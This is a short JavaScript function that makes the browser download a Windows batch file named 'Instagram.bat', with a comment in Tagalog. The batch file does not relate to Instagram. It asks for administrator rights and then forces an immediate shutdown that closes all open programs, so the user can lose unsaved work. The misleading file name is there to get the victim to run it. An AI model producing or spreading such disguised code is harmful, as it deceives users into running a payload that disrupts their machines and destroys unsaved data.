function downloadBat() {

    const batContent = `@echo off
    
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit
)

echo ...
shutdown /s /f /t 0
`;

    const blob = new Blob([batContent], { type: "text/plain" });

    const link = document.createElement("a"); 
    link.href = URL.createObjectURL(blob);
    link.download = "Instagram.bat"; // dito yung pangalan ng file

    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}